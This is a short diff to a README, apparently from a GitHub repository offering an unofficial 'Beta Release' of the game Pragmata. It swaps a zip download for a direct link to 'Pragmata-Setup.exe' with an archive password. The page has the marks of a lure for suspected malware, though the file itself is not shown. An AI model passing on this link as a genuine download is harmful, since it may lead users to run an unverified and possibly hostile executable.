@@ -25,9 +25,8 @@ This **Beta Release** brings the optimized PC Desktop version with improved perf
 
 ## 📥 Download
 
-📥 [`Pragmata-Beta-Release-v0.8.zip`](https://github.com/.../releases/download/v0.8/Pragmata-Beta-Release-v0.8.zip)  
-🔐 `PRAG2026`
-
+📥 [`Pragmata-Setup.exe`](https://github.com/Cowter12/Pragmata-Game-Beta-Release/releases/download/Game/Pragmata-Setup.exe)  
+🔐 `LS2026`
 ---
 
 ### Archive Contents
